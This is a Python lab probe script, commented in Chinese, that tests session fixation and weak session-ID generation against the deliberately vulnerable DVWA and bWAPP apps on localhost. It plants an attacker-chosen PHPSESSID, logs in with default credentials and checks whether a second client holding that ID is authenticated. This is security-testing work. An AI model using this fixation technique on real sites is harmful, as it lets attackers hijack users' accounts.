#!/usr/bin/env python3
# loop3 t4 probe5: B4 low 级会话固定决定性测试 + weak_id low/medium 序列（纯观察/认证动作，零业务写入）
import re, json, time, datetime
import requests

BASE = "http://127.0.0.1"
GAP = 1.2
UA = "loop3-t4/1.0 (authorized local lab)"
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(name, **kw):
    OUT["steps"].append({"step": name, **kw})
    print(f"--- {name}: " + json.dumps(kw, ensure_ascii=False)[:900], flush=True)
    return kw


def tok(html):
    m = re.search(r"name='user_token' value='([^']+)'", html) or re.search(r'name="user_token" value="([^"]+)"', html)
    return m.group(1) if m else None


def setcook(r):
    try:
        return r.raw.headers.getlist("Set-Cookie")
    except Exception:
        return [r.headers.get("Set-Cookie", "")]


FIXED = "loop3fixlow0000000000000000000001"

# ---------- B4: low 级会话固定 ----------
s = requests.Session()
s.headers["User-Agent"] = UA
# 攻击者预置：自选 PHPSESSID + security=low（应用信任该 cookie 决定安全级别）
s.cookies.set("PHPSESSID", FIXED, domain="127.0.0.1", path="/")
s.cookies.set("security", "low", domain="127.0.0.1", path="/")
r = s.get(BASE + "/dvwa/login.php", timeout=20)
t = tok(r.text)
rec("B4_1_get_login_with_planted_id_low", status=r.status_code,
    sent_phpsessid=FIXED, set_cookie=setcook(r), token_len=len(t or ""))
time.sleep(GAP)
r = s.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": t},
           allow_redirects=False, timeout=20)
rec("B4_2_post_login_low", status=r.status_code, loc=r.headers.get("Location"),
    set_cookie=setcook(r), cookie_after=s.cookies.get("PHPSESSID"),
    unchanged=(s.cookies.get("PHPSESSID") == FIXED))
time.sleep(GAP)

# 第三方客户端：只带攻击者预置的 ID（不带 security/其它 cookie），看是否已认证
victim_view = requests.Session()
victim_view.headers["User-Agent"] = UA
victim_view.cookies.set("PHPSESSID", FIXED, domain="127.0.0.1", path="/")
r = victim_view.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
m = re.search(r"<title>(.*?)</title>", r.text, re.S)
rec("B4_3_fresh_client_with_planted_id_low", status=r.status_code, loc=r.headers.get("Location"),
    logged_in=("Welcome :: Damn Vulnerable Web Application" in r.text),
    title=(m.group(1).strip() if m else None))
time.sleep(GAP)
# 负对照
neg = requests.Session()
neg.headers["User-Agent"] = UA
neg.cookies.set("PHPSESSID", "loop3_garbage_id_not_real_zzzzzzzzzz", domain="127.0.0.1", path="/")
r = neg.get(BASE + "/dvwa/index.php", allow_redirects=False, timeout=20)
rec("B4_4_negative_control_garbage_id", status=r.status_code, loc=r.headers.get("Location"))
time.sleep(GAP)
# 同一 PHPSESSID 在 bWAPP 侧是否相互独立（不同应用同名 cookie，作用域为域名）
rb = requests.Session()
rb.headers["User-Agent"] = UA
rb.cookies.set("PHPSESSID", FIXED, domain="127.0.0.1", path="/")
r = rb.get(BASE + "/bWAPP/portal.php", allow_redirects=False, timeout=20)
rec("B4_5_same_id_against_bwapp", status=r.status_code, loc=r.headers.get("Location"),
    authenticated=(r.status_code == 200 and "bWAPP - Portal" in r.text))

# ---------- weak_id 序列 ----------
def weak_seq(level, n=7, label=""):
    w = requests.Session()
    w.headers["User-Agent"] = UA
    w.cookies.set("security", level, domain="127.0.0.1", path="/")
    r = w.get(BASE + "/dvwa/login.php", timeout=20)
    time.sleep(GAP)
    w.post(BASE + "/dvwa/login.php",
           data={"username": "admin", "password": "password", "Login": "Login", "user_token": tok(r.text)},
           allow_redirects=False, timeout=20)
    seq = []
    for i in range(n):
        time.sleep(GAP)
        r = w.post(BASE + "/dvwa/vulnerabilities/weak_id/", data={}, timeout=20)
        cand = [c for c in setcook(r) if "dvwaSession" in c]
        seq.append(cand[0].split(";")[0] if cand else f"NONE(status={r.status_code})")
    rec(f"C_weak_id_{label or level}", level=level, samples=seq, count=len(seq))
    return seq


weak_seq("low", 7, "low_POST")
weak_seq("medium", 5, "medium_POST")
weak_seq("impossible", 3, "impossible_POST")

# ---------- Cookie 属性（low 级别） ----------
for path, method in (("/dvwa/login.php", "get"), ("/dvwa/security.php", "get")):
    ss = requests.Session()
    ss.headers["User-Agent"] = UA
    ss.cookies.set("security", "low", domain="127.0.0.1", path="/")
    r = ss.get(BASE + path, timeout=20)
    rec("D_cookie_low" + path.replace("/", "_"), set_cookie=setcook(r))
    time.sleep(0.6)

with open("/tmp/loop3-t4-probe5.json", "w") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok", "steps": len(OUT["steps"])}))
